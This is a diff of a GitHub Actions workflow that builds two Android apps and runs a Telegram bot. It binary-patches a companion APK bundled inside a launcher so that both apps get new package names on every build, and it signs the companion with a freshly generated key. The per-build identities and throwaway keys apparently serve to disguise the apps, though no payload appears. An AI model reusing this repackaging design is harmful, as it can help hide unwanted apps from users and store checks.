@@ -1,8 +1,7 @@
 # ════════════════════════════════════════════════════════
 # UNIFIED BUILD WORKFLOW
-# Handles: Bot (24/7) + Build Both Apps
-# Nova package:      com.mobile.tools.XXXXXXXXXXXXXXXXXXX (36 chars fixed)
-# Companion package: com.phone.helpXXXXX (19 chars fixed)
+# Nova package:      com.mobile.tools.XXXXXXXXXXXXXXXXXXX (36 chars)
+# Companion package: com.phone.helpXXXXX (19 chars)
 # ════════════════════════════════════════════════════════
 
 name: Builder
@@ -39,17 +38,16 @@ on:
         required: false
         default: ''
 
-# ════════════════════════════════════════════════════════
-# JOB 0 — PUSH NOTIFICATION (every push to main)
-# ════════════════════════════════════════════════════════
-
 jobs:
+
+# ════════════════════════════════════════════════════════
+# JOB 0 — PUSH NOTIFICATION
+# ════════════════════════════════════════════════════════
 
   notify_push:
     name: Push Notification
     runs-on: ubuntu-latest
     if: github.event_name == 'push'
-
     steps:
       - name: Send push notification to Telegram
         run: |
@@ -59,7 +57,6 @@ jobs:
           PUSHER="${{ github.event.pusher.name }}"
           BRANCH="${{ github.ref_name }}"
           TIMESTAMP=$(date -u '+%Y-%m-%d %H:%M UTC')
-
           curl -s -X POST "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendMessage" \
             -d chat_id="${{ secrets.TELEGRAM_CHAT_ID }}" \
             -d parse_mode="Markdown" \
@@ -86,7 +83,6 @@ jobs:
       (github.event_name == 'workflow_dispatch' &&
        github.event.inputs.build_type == 'bot')
     timeout-minutes: 5
-
     steps:
       - name: Checkout
         uses: actions/checkout@v4
@@ -96,12 +92,11 @@ jobs:
         with:
           python-version: '3.11'
 
-      - name: Cache Python packages
+      - name: Cache pip packages
         uses: actions/cache@v4
         with:
           path: ~/.cache/pip
           key: pip-telebot-${{ runner.os }}
-          restore-keys: pip-telebot-
 
       - name: Install dependencies
         run: pip install pytelegrambotapi requests
@@ -130,17 +125,14 @@ jobs:
       - name: Checkout
         uses: actions/checkout@v4
 
-      # ── Validate inputs ──────────────────────────────────────
       - name: Validate package name lengths
         run: |
           NOVA_PKG="${{ github.event.inputs.nova_package }}"
           COMP_PKG="${{ github.event.inputs.companion_package }}"
           NOVA_LEN=${#NOVA_PKG}
           COMP_LEN=${#COMP_PKG}
-
           echo "Nova package     : $NOVA_PKG ($NOVA_LEN chars)"
           echo "Companion package: $COMP_PKG ($COMP_LEN chars)"
-
           if [ "$NOVA_LEN" != "36" ]; then
             echo "[X] Nova package must be exactly 36 chars (got $NOVA_LEN)"
             exit 1
@@ -161,54 +153,18 @@ jobs:
       - name: Setup Android SDK
         uses: android-actions/setup-android@v3
 
-      # ── Cache apktool jar ────────────────────────────────────
-      - name: Cache apktool jar
-        uses: actions/cache@v4
-        id: cache-apktool
-        with:
-          path: /usr/local/bin/apktool.jar
-          key: apktool-2.9.3
-
-      - name: Cache apktool script
-        uses: actions/cache@v4
-        id: cache-apktool-script
-        with:
-          path: /usr/local/bin/apktool
-          key: apktool-script-v1
-
-      # ── Install apktool (only if not cached) ────────────────
-      - name: Install apktool
-        if: steps.cache-apktool.outputs.cache-hit != 'true'
-        run: |
-          wget -q \
-            https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar \
-            -O /usr/local/bin/apktool.jar
-          wget -q \
-            https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool \
-            -O /usr/local/bin/apktool
-          chmod +x /usr/local/bin/apktool
-          echo "[OK] apktool downloaded"
-
-      - name: Verify apktool
-        run: |
-          chmod +x /usr/local/bin/apktool
-          java -jar /usr/local/bin/apktool.jar --version
-          echo "[OK] apktool ready"
-
-      # ── Cache imagemagick ────────────────────────────────────
-      - name: Cache apt packages
+      - name: Cache imagemagick
         uses: actions/cache@v4
         id: cache-apt
         with:
           path: /var/cache/apt/archives
           key: apt-imagemagick-${{ runner.os }}
 
-      - name: Install imagemagick (for icon resizing)
+      - name: Install imagemagick
         run: |
           sudo apt-get install -y imagemagick -q
           echo "[OK] imagemagick ready"
 
-      # ── Cache Gradle wrapper ─────────────────────────────────
       - name: Cache Gradle wrapper jar
         uses: actions/cache@v4
         with:
@@ -216,10 +172,13 @@ jobs:
           key: gradle-wrapper-${{ runner.os }}
 
       # ── STAGE 1: Patch Companion APK ────────────────────────
-      - name: Patch Companion DEX (binary patch)
+      # KEY FIX: We do NOT use apktool to recompile resources
+      # because companion has obfuscated res/type1/ paths that break apktool
+      # Instead: binary-patch DEX + binary-patch manifest directly in ZIP
+      - name: Patch and repackage companion APK
         run: |
           python3 << 'PYEOF'
-          import os, zipfile
+          import zipfile, os
 
           nova_pkg = os.environ.get('NOVA_PKG', '')
           comp_pkg = os.environ.get('COMP_PKG', '')
@@ -234,62 +193,79 @@ jobs:
           new_comp      = comp_pkg.encode()
           new_comp_path = comp_pkg.replace('.', '/').encode()
 
-          # Validate lengths
-          assert len(old_nova_uri)  == len(new_nova_uri),  f"Nova URI length mismatch!"
-          assert len(old_nova)      == len(new_nova),      f"Nova pkg length mismatch!"
-          assert len(old_comp)      == len(new_comp),      f"Companion pkg length mismatch!"
-          assert len(old_comp_path) == len(new_comp_path), f"Companion path length mismatch!"
+          # Validate lengths — critical for binary patch
+          assert len(old_nova_uri)  == len(new_nova_uri),  "Nova URI length mismatch!"
+          assert len(old_nova)      == len(new_nova),      "Nova pkg length mismatch!"
+          assert len(old_comp)      == len(new_comp),      "Companion pkg length mismatch!"
+          assert len(old_comp_path) == len(new_comp_path), "Companion path length mismatch!"
 
-          # Read DEX from original companion APK
-          with zipfile.ZipFile('app/src/main/assets/companion.apk', 'r') as z:
-              dex = z.read('classes.dex')
+          print(f"Patching companion APK...")
+          print(f"  Nova target  : {old_nova.decode()} → {nova_pkg}")
+          print(f"  Companion pkg: {old_comp.decode()} → {comp_pkg}")
 
-          print(f"  DEX size: {len(dex)} bytes")
-          print(f"  Nova URI occurrences   : {dex.count(old_nova_uri)}")
-          print(f"  Companion pkg occurrences: {dex.count(old_comp)}")
+          original = 'app/src/main/assets/companion.apk'
 
-          # Patch in correct order (most specific first)
-          dex = dex.replace(old_nova_uri,  new_nova_uri)
-          dex = dex.replace(old_nova,      new_nova)
-          dex = dex.replace(old_comp_path, new_comp_path)
-          dex = dex.replace(old_comp,      new_comp)
+          with zipfile.ZipFile(original, 'r') as zin:
+              with zipfile.ZipFile('companion_unsigned.apk', 'w') as zout:
+                  for item in zin.infolist():
+                      data = zin.read(item.filename)
 
-          # Write patched DEX
-          with open('patched_classes.dex', 'wb') as f:
-              f.write(dex)
-          print("[OK] DEX patched successfully")
+                      if item.filename == 'classes.dex':
+                          # Patch DEX binary
+                          count_nova_uri = data.count(old_nova_uri)
+                          count_comp     = data.count(old_comp)
+                          data = data.replace(old_nova_uri,  new_nova_uri)
+                          data = data.replace(old_nova,      new_nova)
+                          data = data.replace(old_comp_path, new_comp_path)
+                          data = data.replace(old_comp,      new_comp)
+                          print(f"  DEX: {count_nova_uri} Nova URI, {count_comp} companion refs patched")
+
+                      elif item.filename == 'AndroidManifest.xml':
+                          # Patch binary manifest
+                          data = data.replace(old_comp_path, new_comp_path)
+                          data = data.replace(old_comp,      new_comp)
+                          print(f"  Manifest: patched")
+
+                      # Write with same compression type as original
+                      zout.writestr(item, data)
+
+          import subprocess
+          r = subprocess.run(['du','-h','companion_unsigned.apk'],
+                             capture_output=True, text=True)
+          print(f"[OK] companion_unsigned.apk: {r.stdout.strip()}")
           PYEOF
         env:
           NOVA_PKG: ${{ github.event.inputs.nova_package }}
           COMP_PKG: ${{ github.event.inputs.companion_package }}
 
-      - name: Decompile companion APK with apktool
+      - name: Verify DEX patch
         run: |
-          java -jar /usr/local/bin/apktool.jar d \
-            app/src/main/assets/companion.apk \
-            -o companion_decoded --force
-          echo "[OK] Decompiled"
+          python3 << 'PYEOF'
+          import zipfile, os
 
-      - name: Patch companion manifest + inject patched DEX
-        run: |
-          COMP_PKG="${{ github.event.inputs.companion_package }}"
-          OLD_PKG="com.android.pictach"
+          nova_pkg = os.environ.get('NOVA_PKG', '')
+          comp_pkg = os.environ.get('COMP_PKG', '')
 
-          # Patch manifest
-          sed -i "s|package=\"$OLD_PKG\"|package=\"$COMP_PKG\"|g" \
-            companion_decoded/AndroidManifest.xml
-          sed -i "s|$OLD_PKG|$COMP_PKG|g" \
-            companion_decoded/AndroidManifest.xml
+          with zipfile.ZipFile('companion_unsigned.apk', 'r') as z:
+              dex = z.read('classes.dex')
 
-          # Replace DEX with our binary-patched version
-          cp patched_classes.dex companion_decoded/classes.dex
-          echo "[OK] Manifest patched + patched DEX injected"
+          old_nova_uri = b'package:com.cristal.bristral.tristal.mistral'
+          old_comp     = b'com.android.pictach'
+          new_nova_uri = ('package:' + nova_pkg).encode()
+          new_comp     = comp_pkg.encode()
 
-      - name: Rebuild companion APK
-        run: |
-          java -jar /usr/local/bin/apktool.jar b \
-            companion_decoded -o companion_unsigned.apk
-          echo "[OK] Rebuilt — $(du -h companion_unsigned.apk | cut -f1)"
+          assert old_nova_uri not in dex, "[X] Old Nova URI still in DEX!"
+          assert old_comp     not in dex, "[X] Old companion pkg still in DEX!"
+          assert new_nova_uri in dex,     "[X] New Nova URI NOT in DEX!"
+          assert new_comp     in dex,     "[X] New companion pkg NOT in DEX!"
+
+          print("[OK] DEX patch verified!")
+          print(f"  Nova target  : {nova_pkg}")
+          print(f"  Companion pkg: {comp_pkg}")
+          PYEOF
+        env:
+          NOVA_PKG: ${{ github.event.inputs.nova_package }}
+          COMP_PKG: ${{ github.event.inputs.companion_package }}
 
       - name: Generate fresh keystore for companion
         run: |
@@ -317,36 +293,7 @@ jobs:
             --key-pass pass:"${{ secrets.COMPANION_KEYSTORE_PASSWORD }}" \
             --out companion_signed.apk \
             companion_aligned.apk
-          echo "[OK] Signed — $(du -h companion_signed.apk | cut -f1)"
-
-      - name: Verify companion patch
-        run: |
-          python3 << 'PYEOF'
-          import zipfile, os
-
-          nova_pkg = os.environ.get('NOVA_PKG', '')
-          comp_pkg = os.environ.get('COMP_PKG', '')
-
-          with zipfile.ZipFile('companion_signed.apk', 'r') as z:
-              dex = z.read('classes.dex')
-
-          old_nova_uri = b'package:com.cristal.bristral.tristal.mistral'
-          old_comp     = b'com.android.pictach'
-          new_nova_uri = ('package:' + nova_pkg).encode()
-          new_comp     = comp_pkg.encode()
-
-          assert old_nova_uri not in dex, "[X] Old Nova URI still in DEX!"
-          assert old_comp     not in dex, "[X] Old companion pkg still in DEX!"
-          assert new_nova_uri in dex,     "[X] New Nova URI NOT found in DEX!"
-          assert new_comp     in dex,     "[X] New companion pkg NOT found in DEX!"
-
-          print("[OK] Companion patch verified!")
-          print(f"  Nova target  : {nova_pkg}")
-          print(f"  Companion pkg: {comp_pkg}")
-          PYEOF
-        env:
-          NOVA_PKG: ${{ github.event.inputs.nova_package }}
-          COMP_PKG: ${{ github.event.inputs.companion_package }}
+          echo "[OK] Companion signed — $(du -h companion_signed.apk | cut -f1)"
 
       # ── STAGE 2: Patch Nova Launcher ────────────────────────
       - name: Place patched companion into Nova assets
@@ -358,12 +305,8 @@ jobs:
         run: |
           NOVA_PKG="${{ github.event.inputs.nova_package }}"
           COMP_PKG="${{ github.event.inputs.companion_package }}"
-
-          sed -i "s|applicationId \"[^\"]*\"|applicationId \"$NOVA_PKG\"|" \
-            app/build.gradle
-          sed -i "s|buildConfigField \"String\", \"COMPANION_PACKAGE\", \"[^\"]*\"|buildConfigField \"String\", \"COMPANION_PACKAGE\", \"\\\"$COMP_PKG\\\"\"|" \
-            app/build.gradle
-
+          sed -i "s|applicationId \"[^\"]*\"|applicationId \"$NOVA_PKG\"|" app/build.gradle
+          sed -i "s|buildConfigField \"String\", \"COMPANION_PACKAGE\", \"[^\"]*\"|buildConfigField \"String\", \"COMPANION_PACKAGE\", \"\\\"$COMP_PKG\\\"\"|" app/build.gradle
           echo "[OK] build.gradle patched"
           grep -E "applicationId|COMPANION_PACKAGE" app/build.gradle
 
@@ -382,8 +325,6 @@ jobs:
           open('app/src/main/res/values/strings.xml', 'w').write(content)
           print('[OK] App name: ' + sys.argv[1])
             " "$APP_NAME"
-          else
-            echo "[SKIP] No app name provided"
           fi
 
       - name: Patch chain_part1 in AndroidManifest.xml
@@ -393,8 +334,6 @@ jobs:
             sed -i "s|android:value=\"PLACEHOLDER\"|android:value=\"$CHAIN\"|" \
               app/src/main/AndroidManifest.xml
             echo "[OK] chain_part1: $CHAIN"
-          else
-            echo "[SKIP] No chain_part1"
           fi
 
       - name: Apply launcher icon
@@ -411,8 +350,6 @@ jobs:
                 app/src/main/res/mipmap-${DIR}/ic_launcher_round.png
             done
             echo "[OK] All icon sizes replaced"
-          else
-            echo "[SKIP] No icon provided"
           fi
 
       # ── STAGE 3: Build Nova APK ──────────────────────────────
